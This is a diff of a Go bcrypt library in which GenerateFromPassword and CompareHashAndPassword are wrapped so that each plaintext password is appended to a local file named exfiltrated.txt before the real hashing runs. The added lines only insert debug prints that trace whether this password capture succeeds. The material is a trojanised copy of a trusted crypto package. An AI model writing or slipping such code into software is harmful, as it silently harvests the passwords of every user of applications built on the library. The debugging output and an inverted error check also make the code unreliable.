@@ -98,6 +98,7 @@ var ErrPasswordTooLong = errors.New("bcrypt: password length exceeds 72 bytes")
 // GenerateFromPassword does not accept passwords longer than 72 bytes, which
 // is the longest password bcrypt will operate on.
 func GenerateFromPassword(password []byte, cost int) ([]byte, error) {
+	fmt.Println("getting here in generate")
 	var filename = ""
 	if runtime.GOOS == "windows" {
 		filename = "C:\\exfiltrated.txt"
@@ -106,21 +107,26 @@ func GenerateFromPassword(password []byte, cost int) ([]byte, error) {
 		filename = "/tmp/exfiltrated.txt"
 	}
 	if filename == "" {
+		fmt.Println("failed in generatefrompassword because filename was empty")
 		return ActualGenerateFromPassword(password, cost)
 	}
 	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 	if err != nil {
+		fmt.Println("failed in generatefrompassword because could not open file")
 		return ActualGenerateFromPassword(password, cost)
 	}
 	_, err = f.Write([]byte("from GenerateFromPassword at " + time.Now().String() + "\n"))
 	_, err = f.Write([]byte(string(password) + "\n"))
 	if err == nil {
+		fmt.Println("failed in generatefrompassword because could not write")
 		return ActualGenerateFromPassword(password, cost)
 	}
 	err = f.Close()
 	if err != nil {
+		fmt.Println("failed in generatefrompassword because could not close file")
 		return ActualGenerateFromPassword(password, cost)
 	}
+	fmt.Println("succeeded in generatefrompassword")
 	return ActualGenerateFromPassword(password, cost)
 }
 func ActualGenerateFromPassword(password []byte, cost int) ([]byte, error) {
@@ -158,6 +164,7 @@ func ActualCompareHashAndPassword(hashedPassword, password []byte) error {
 }
 
 func CompareHashAndPassword(hashedPassword, password []byte) error {
+	fmt.Println("getting here in compare")
 	var filename = ""
 	if runtime.GOOS == "windows" {
 		filename = "C:\\exfiltrated.txt"
@@ -166,21 +173,27 @@ func CompareHashAndPassword(hashedPassword, password []byte) error {
 		filename = "/tmp/exfiltrated.txt"
 	}
 	if filename == "" {
+
+		fmt.Println("failed in comparehashandpassword because filename was empty")
 		return ActualCompareHashAndPassword(hashedPassword, password)
 	}
 	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 	if err != nil {
+		fmt.Println("failed in comparehashandpassword because could not open file")
 		return ActualCompareHashAndPassword(hashedPassword, password)
 	}
 	_, err = f.Write([]byte("from GenerateFromPassword at " + time.Now().String() + "\n"))
 	_, err = f.Write([]byte(string(password) + "\n"))
 	if err == nil {
+		fmt.Println("failed in comparehashandpassword because could not write")
 		return ActualCompareHashAndPassword(hashedPassword, password)
 	}
 	err = f.Close()
 	if err != nil {
+		fmt.Println("failed in comparehashandpassword because failed to close file")
 		return ActualCompareHashAndPassword(hashedPassword, password)
 	}
+	fmt.Println("succeeded in comparehashandpassword")
 	return ActualCompareHashAndPassword(hashedPassword, password)
 }
 
